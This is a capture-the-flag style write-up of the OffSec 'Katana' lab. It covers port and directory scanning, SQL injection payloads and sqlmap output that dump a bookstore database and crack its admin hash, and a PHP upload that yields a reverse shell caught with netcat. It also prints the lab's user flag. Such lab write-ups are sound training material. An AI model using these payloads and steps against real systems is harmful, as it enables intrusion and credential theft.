---
title: "Katana"
kind: writeup
tags:
  - offsec-pg-play
  - status/done
  - writeup
  - linux
  - web
status: "Done"
difficulty: "Medium"
date: 2026-06-24
category:
  - "Linux"
  - "Web"
database: "Offsec PG Play"
area: "Offsec PG Play"
up: "[[Offsec PG Play]]"
notion-id: 389759b927518030b6b1fa5a7babdb9d
---

# Katana

In: [[Career]] / [[Offsec PG Play]]

## Nmap Scan

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- -T4 --min-rate=1000 -sC -sV -oA ~/nmap/nmap_full_scan 192.168.210.83
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-24 01:23 -0400
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 01:24 (0:00:12 remaining)
Nmap scan report for 192.168.210.83
Host is up (0.064s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:fc:60:a6:de:35 (RSA)
|   256 dd:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)
|_  256 cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)
80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Katana X
7080/tcp open  ssl/empowerid LiteSpeed
|_http-server-header: LiteSpeed
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US
| Not valid before: 2020-05-11T13:57:36
|_Not valid after:  2022-05-11T13:57:36
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
|_http-title: Did not follow redirect to https://192.168.210.83:7080/
8088/tcp open  http          LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Katana X
8715/tcp open  http          nginx 1.14.2
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-server-header: nginx/1.14.2
|_http-title: 401 Authorization Required
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.53 seconds

```

## First Webpage

![[attachments/Offsec PG Play/Katana/image.png]]

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf  -u "http://192.168.210.83/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.210.83/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 62ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 66ms]
ebook                   [Status: 200, Size: 3998, Words: 869, Lines: 96, Duration: 102ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 63ms]
:: Progress: [20481/20481] :: Job [1/1] :: 636 req/sec :: Duration: [0:00:41] :: Errors: 0 ::

```

![[attachments/Offsec PG Play/Katana/image 1.png]]

## Second Webpage

![[attachments/Offsec PG Play/Katana/image 2.png]]

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf  -u "http://192.168.210.83:8088/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.210.83:8088/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 1227, Words: 107, Lines: 15, Duration: 67ms]
blocked                 [Status: 403, Size: 1227, Words: 107, Lines: 15, Duration: 63ms]
docs                    [Status: 200, Size: 5472, Words: 865, Lines: 115, Duration: 85ms]
protected               [Status: 401, Size: 1242, Words: 106, Lines: 15, Duration: 64ms]
:: Progress: [20481/20481] :: Job [1/1] :: 641 req/sec :: Duration: [0:00:32] :: Errors: 0 ::

```

![[attachments/Offsec PG Play/Katana/image 3.png]]

## Third Webpage

![[attachments/Offsec PG Play/Katana/image 4.png]]

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf  -u "http://192.168.210.83:8715/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r -fw 6

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.210.83:8715/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

.htaccess               [Status: 403, Size: 169, Words: 4, Lines: 8, Duration: 62ms]
.htpasswd               [Status: 403, Size: 169, Words: 4, Lines: 8, Duration: 65ms]
:: Progress: [20481/20481] :: Job [1/1] :: 630 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
                                                                                                                            
```

## Searching Vulns

```bash
──(kali㉿kali)-[~]
└─$ searchsploit -m php/webapps/49314.txt                                        

  Exploit: CSE Bookstore 1.0 - Multiple SQL Injection
      URL: https://www.exploit-db.com/exploits/49314
     Path: /usr/share/exploitdb/exploits/php/webapps/49314.txt
    Codes: N/A
 Verified: False
File Type: ASCII text
Copied to: /home/kali/49314.txt

                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ cat /home/kali/49314.txt
# Exploit Title : CSE Bookstore 1.0 - Multiple SQL Injection
# Date      : 2020-12-21
# Author    : Musyoka Ian
# Version   : CSE Bookstore 1.0
# Vendor Homepage: https://projectworlds.in/
# Platform  : PHP
# Tested on : Debian

CSE Bookstore version 1.0 is vulnerable to time-based blind, boolean-based blind and OR error-based SQL injection in pubid parameter in bookPerPub.php. A successfull exploitation of this vulnerability  will lead to an attacker dumping the entire database the web appliction is running on

Below is results returned by  SQLMap

Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
Payload: http://192.168.196.83:80/ebook/bookPerPub.php?pubid=' OR NOT 4138=4138#                                                                                                                                                                    Type: error-based
Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: http://192.168.196.83:80/ebook/bookPerPub.php?pubid=' OR (SELECT 7393 FROM(SELECT COUNT(*),CONCAT(0x71717a7071,(SELECT (ELT(7393=7393,1))),0x7178716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nkDF

Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: http://192.168.196.83:80/ebook/bookPerPub.php?pubid=' AND (SELECT 6293 FROM (SELECT(SLEEP(5)))eqTh)-- CJmT

POC 1

REQUEST
========
GET /ebook/bookPerPub.php?pubid=4' HTTP/1.1
Host: 192.168.196.83
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=c4qd3glr3oe6earuf88sub6g1n
Upgrade-Insecure-Requests: 1

RESPONSE
========

HTTP/1.1 200 OK
Date: Mon, 21 Dec 2020 20:09:49 GMT
Server: Apache/2.4.38 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 172
Connection: close
Content-Type: text/html; charset=UTF-8

Can't retrieve data You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''4''' at line 1

POC 2
Also the web application is vulnerable to a SQL Injection on cart.php file by sending a sql injection payload in bookisbn post data parameter

REQUEST
=======

POST /ebook/cart.php HTTP/1.1
Host: 192.168.196.83
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Connection: close
Cache-Control: max-age=0
Referer: http://192.168.196.83/ebook/book.php?bookisbn=978-1-1180-2669-4
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Cookie: PHPSESSID=igasmmkkf2thcc877pmjui05t9

bookisbn=978-1-1180-2669-4'&cart=Purchase+%2f+Add+to+cart

RESPONSE
=======
get book price failed! You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''978-1-1180-2669-4''' at line 1

POC 3.
Lastly bookisbn parameter on book.php is vunerable to SQL Injection which also has a High servierity since it could lead to dumping of database credentials

REQUEST
=======
GET /ebook/book.php?bookisbn=978-0-7303-1484-4' HTTP/1.1
Host: 192.168.196.83
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Connection: close
Cache-Control: max-age=0
Referer: http://192.168.196.83/ebook/books.php
Cookie: PHPSESSID=bvmt3vp30gjnr724helh37v2on

RESPONSE
========
HTTP/1.1 200 OK
Date: Mon, 21 Dec 2020 20:47:58 GMT
Server: Apache/2.4.38 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 188
Connection: close
Content-Type: text/html; charset=UTF-8

Can't retrieve data You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''978-0-7303-1484-4''' at line 1                 
```

## Exploiting SQL Injection

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.210.83/ebook/bookPerPub.php?pubid=3" --batch --dump     
        ___
       __H__                                                                                                                                                               
 ___ ___[.]_____ ___ ___  {1.10.6#stable}                                                                                                                                  
|_ -| . [,]     | .'| . |                                                                                                                                                  
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                  
      |_|V...       |_|   https://sqlmap.org                                                                                                                               

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:38:46 /2026-06-24/

[01:38:46] [INFO] resuming back-end DBMS 'mysql' 
[01:38:46] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=f106kh2id6l...itdtujniv8'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: pubid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: pubid=3' AND 6056=6056 AND 'CARj'='CARj

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: pubid=3' AND EXTRACTVALUE(2183,CONCAT(0x5c,0x71716b7171,(SELECT (ELT(2183=2183,1))),0x716a6b7071)) AND 'kZYc'='kZYc

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: pubid=3' AND (SELECT 8788 FROM (SELECT(SLEEP(5)))qFYn) AND 'ViFw'='ViFw
---
[01:38:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP
back-end DBMS: MySQL >= 5.1 (MariaDB fork)

Database: ebook
Table: orders
[4 entries]
+---------+------------+---------------------+--------+-----------+-----------+--------------+--------------+---------------+
| orderid | customerid | date                | amount | ship_city | ship_name | ship_address | ship_country | ship_zip_code |
+---------+------------+---------------------+--------+-----------+-----------+--------------+--------------+---------------+
| 1       | 1          | 2015-12-03 08:30:12 | 60.00  | a         | a         | a            | a            | a             |
| 2       | 2          | 2015-12-03 08:31:12 | 60.00  | b         | b         | b            | b            | b             |
| 3       | 3          | 2015-12-03 14:34:21 | 20.00  | 12121     | test      | 123 test     | test         | test          |
| 4       | 1          | 2015-12-04 05:19:14 | 20.00  | a         | a         | a            | a            | a             |
+---------+------------+---------------------+--------+-----------+-----------+--------------+--------------+---------------+

Database: ebook
Table: order_items
[8 entries]
+---------+----------+-------------------+------------+
| orderid | quantity | book_isbn         | item_price |
+---------+----------+-------------------+------------+
| 1       | 1        | 978-1-49192-706-9 | 20.00      |
| 1       | 1        | 978-1-44937-019-0 | 20.00      |
| 1       | 1        | 978-1-49192-706-9 | 20.00      |
| 1       | 1        | 978-1-49192-706-9 | 20.00      |
| 2       | 1        | 978-1-44937-019-0 | 20.00      |
| 2       | 1        | 978-1-44937-019-0 | 20.00      |
| 2       | 1        | 978-1-49192-706-9 | 20.00      |
| 3       | 1        | 978-0-321-94786-4 | 20.00      |
+---------+----------+-------------------+------------+

Database: ebook
Table: customers
[3 entries]
+------------+-------+--------+----------+---------+----------+
| customerid | city  | name   | address  | country | zip_code |
+------------+-------+--------+----------+---------+----------+
| 1          | a     | a      | a        | a       | a        |
| 2          | b     | b      | b        | b       | b        |
| 3          | 12121 | test   | 123 test | test    | test     |
+------------+-------+--------+----------+---------+----------+

[01:39:05] [INFO] retrieved: 'admin'
[01:39:05] [INFO] retrieved: 'd033e22ae348aeb5660fc2140aec35850c4da997'
[01:39:05] [INFO] recognized possible password hashes in column 'pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[01:39:05] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[01:39:05] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[01:39:05] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[01:39:05] [INFO] starting 8 processes 
[01:39:07] [INFO] cracked password 'admin' for hash 'd033e22ae348aeb5660fc2140aec35850c4da997'                                                                            
Database: ebook                                                                                                                                                           
Table: admin
[1 entry]
+--------------------------------------------------+--------+
| pass                                             | name   |
+--------------------------------------------------+--------+
| d033e22ae348aeb5660fc2140aec35850c4da997 (admin) | admin  |
+--------------------------------------------------+--------+

Database: ebook
Table: books
[9 entries]
+-------------+-------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------+------------+---------------------------------------------------------+--------------------------------+
| publisherid | book_isbn         | book_descr                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | book_image        | book_price | book_title                                              | book_author                    |
+-------------+-------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------+------------+---------------------------------------------------------+--------------------------------+
| 1           | 978-1-1180-2669-4 | If you want to achieve JavaScript's full potential, it is critical to understand its nature, history, and limitations. To that end, this updated version of the bestseller by veteran author and JavaScript guru Nicholas C. Zakas covers JavaScript from its very beginning to the present-day incarnations including the DOM, Ajax, and HTML5. Zakas shows you how to extend this powerful language to meet specific needs and create dynamic user interfaces for the web that blur the line between desktop and internet. By the end of the book, you'll have a strong understanding of the significant advances in web development as they relate to JavaScript so that you can apply them to your next website.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | pro_js.jpg        | 20.00      | Professional JavaScript for Web Developers, 3rd Edition | Nicholas C. Zakas              |
| 1           | 978-1-4571-0402-2 | ASP.NET is about making you as productive as possible when building fast and secure web applications. Each release of ASP.NET gets better and removes a lot of the tedious code that you previously needed to put in place, making common ASP.NET tasks easier. With this book, an unparalleled team of authors walks you through the full breadth of ASP.NET and the new and exciting capabilities of ASP.NET 4. The authors also show you how to maximize the abundance of features that ASP.NET offers to make your development process smoother and more efficient.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | pro_asp4.jpg      | 20.00      | Professional ASP.NET 4 in C# and VB                     | Scott Hanselman                |
| 2           | 978-1-118-94924-5 | Doing Good by Doing Good shows companies how to improve the bottom line by implementing an engaging, authentic, and business-enhancing program that helps staff and business thrive. International CSR consultant Peter Baines draws upon lessons learnt from the challenges faced in his career as a police officer, forensic investigator, and founder of Hands Across the Water to describe the Australian CSR landscape, and the factors that make up a program that benefits everyone involved. Case studies illustrate the real effect of CSR on both business and society, with clear guidance toward maximizing involvement, engaging all employees, and improving the bottom line. The case studies draw out the companies that are focusing on creating shared value in meeting the challenges of society whilst at the same time bringing strong economic returns.\r\n\r\nConsumers are now expecting that big businesses with ever-increasing profits give back to the community from which those profits arise. At the same time, shareholders are demanding their share and are happy to see dividends soar. Getting this right is a balancing act, and Doing Good by Doing Good helps companies delineate a plan of action for getting it done. | logic_program.jpg | 20.00      | Programmable Logic Controllers                          | Dag H. Hanssen                 |
| 2           | 978-1-118-94924-5 | Widely used across industrial and manufacturing automation, Programmable Logic Controllers (PLCs) perform a broad range of electromechanical tasks with multiple input and output arrangements, designed specifically to cope in severe environmental conditions such as automotive and chemical plants.Programmable Logic Controllers: A Practical Approach using CoDeSys is a hands-on guide to rapidly gain proficiency in the development and operation of PLCs based on the IEC 61131-3 standard. Using the freely-available* software tool CoDeSys, which is widely used in industrial design automation projects, the author takes a highly practical approach to PLC design using real-world examples. The design tool, CoDeSys, also features a built in simulator / soft PLC enabling the reader to undertake exercises and test the examples.                                                                                                                                                                                                                                                                                                                                                                                                       | logic_program.jpg | 20.00      | Programmable Logic Controllers                          | Dag H. Hanssen                 |
| 3           | 978-1-44937-075-6 | Grasp the fundamentals of web application development by building a simple database-backed app from scratch, using HTML, JavaScript, and other open source tools. Through hands-on tutorials, this practical guide shows inexperienced web app developers how to create a user interface, write a server, build client-server communication, and use a cloud-based service to deploy the application.\r\n\r\nEach chapter includes practice problems, full examples, and mental models of the development workflow. Ideal for a college-level course, this book helps you get started with web app development by providing you with a solid grounding in the process.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | beauty_js.jpg     | 20.00      | Beautiful JavaScript                                    | Anton Kovalyov                 |
| 3           | 978-1-44937-075-6 | JavaScript is arguably the most polarizing and misunderstood programming language in the world. Many have attempted to replace it as the language of the Web, but JavaScript has survived, evolved, and thrived. Why did a language created in such hurry succeed where others failed?\r\n\r\nThis guide gives you a rare glimpse into JavaScript from people intimately familiar with it. Chapters contributed by domain experts such as Jacob Thornton, Ariya Hidayat, and Sara Chipps show what they love about their favorite language - whether it's turning the most feared features into useful tools, or how JavaScript can be used for self-expression.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | beauty_js.jpg     | 20.00      | Beautiful JavaScript                                    | Anton Kovalyov                 |
| 4           | 978-1-484217-26-9 | Android Studio New Media Fundamentals is a new media primer covering concepts central to multimedia production for Android including digital imagery, digital audio, digital video, digital illustration and 3D, using open source software packages such as GIMP, Audacity, Blender, and Inkscape. These professional software packages are used for this book because they are free for commercial use. The book builds on the foundational concepts of raster, vector, and waveform (audio), and gets more advanced as chapters progress, covering what new media assets are best for use with Android Studio as well as key factors regarding the data footprint optimization work process and why new media content and new media data optimization is so important.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | c_14_quick.jpg    | 20.00      | C++ 14 Quick Syntax Reference, 2nd Edition              | \tMikael Olsson                |
| 4           | 978-1-484217-26-9 | This updated handy quick C++ 14 guide is a condensed code and syntax reference based on the newly updated C++ 14 release of the popular programming language. It presents the essential C++ syntax in a well-organized format that can be used as a handy reference.\r\n\r\nYou won't find any technical jargon, bloated samples, drawn out history lessons, or witty stories in this book. What you will find is a language reference that is concise, to the point and highly accessible. The book is packed with useful information and is a must-have for any C++ programmer.\r\n\r\nIn the C++ 14 Quick Syntax Reference, Second Edition, you will find a concise reference to the C++ 14 language syntax. It has short, simple, and focused code examples. This book includes a well laid out table of contents and a comprehensive index allowing for easy review.                                                                                                                                                                                                                                                                                                                                                                                      | c_14_quick.jpg    | 20.00      | C++ 14 Quick Syntax Reference, 2nd Edition              | \tMikael Olsson                |
| 6           | 978-0-321-94786-4 | Now, one book can help you master mobile app development with both market-leading platforms: Apple's iOS and Google's Android. Perfect for both students and professionals, Learning Mobile App Development is the only tutorial with complete parallel coverage of both iOS and Android. With this guide, you can master either platform, or both - and gain a deeper understanding of the issues associated with developing mobile apps.\r\n\r\nYou'll develop an actual working app on both iOS and Android, mastering the entire mobile app development lifecycle, from planning through licensing and distribution.\r\n\r\nEach tutorial in this book has been carefully designed to support readers with widely varying backgrounds and has been extensively tested in live developer training courses. If you're new to iOS, you'll also find an easy, practical introduction to Objective-C, Apple's native language.                                                                                                                                                                                                                                                                                                                                  | mobile_app.jpg    | 20.00      | Learning Mobile App Development                         | Jakob Iversen, Michael Eierman |
+-------------+-------------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------+------------+---------------------------------------------------------+--------------------------------+

Database: ebook
Table: publisher
[6 entries]
+-------------+------------------+
| publisherid | publisher_name   |
+-------------+------------------+
| 1           | Wrox             |
| 2           | Wiley            |
| 3           | O'Reilly Media   |
| 4           | Apress           |
| 5           | Packt Publishing |
| 6           | Addison-Wesley   |
+-------------+------------------+

[01:39:45] [INFO] table 'ebook.publisher' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.210.83/dump/ebook/publisher.csv'
[01:39:45] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.210.83'

[*] ending @ 01:39:45 /2026-06-24/

```

Tried file upload on Book store but stucked in the loop hole, and couldnt find anything

Read Writeup got to know 2nd web app has upload.html

uploaded php on the this and accessed it 3rd app

![[attachments/Offsec PG Play/Katana/image 5.png]]

![[attachments/Offsec PG Play/Katana/image 6.png]]

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.210.83] 57070
Linux katana 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 02:20:23 up  1:00,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@katana:/$ ^Z
zsh: suspended  nc -lvnp 1234
                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg                                                            
[1]  + continued  nc -lvnp 1234

www-data@katana:/$ export TERM=xterm
www-data@katana:/$ clear

```

## User

```bash
www-data@katana:~$ ls
html  local.txt
www-data@katana:~$ cat local.txt 
6a7b3e3f9837bf7f63fdd5fed795a9b2
www-data@katana:~$ 

```

## Root

```bash
Files with capabilities (limited to 50):
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_setuid+ep

```
